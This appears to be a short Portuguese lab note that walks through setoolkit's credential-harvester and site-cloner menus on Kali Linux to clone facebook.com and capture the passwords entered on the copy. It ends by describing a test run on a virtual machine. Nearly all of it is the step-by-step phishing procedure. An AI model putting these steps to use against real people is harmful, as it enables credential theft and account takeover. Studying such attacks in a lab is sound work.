# Phishing para captura de senhas do Facebook

### Ferramentas

- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

```
sudo setoolkit
> Social-Engineering
> Web Site Attack Vectors
> Credential Harvester Attack Method
> Site Cloner: 
http://www.facebook.com

```
### Conclusão

O Ataque foi falho inicialmente, pois o setoolkit não funcionou corretamente em meu sistema de vm de teste usando ArchLinux, pois depende de configurações e libs de python não disponiveis no sistema

Posteriormente ajustando as configurações, foi possível visualizar as informações através do terminal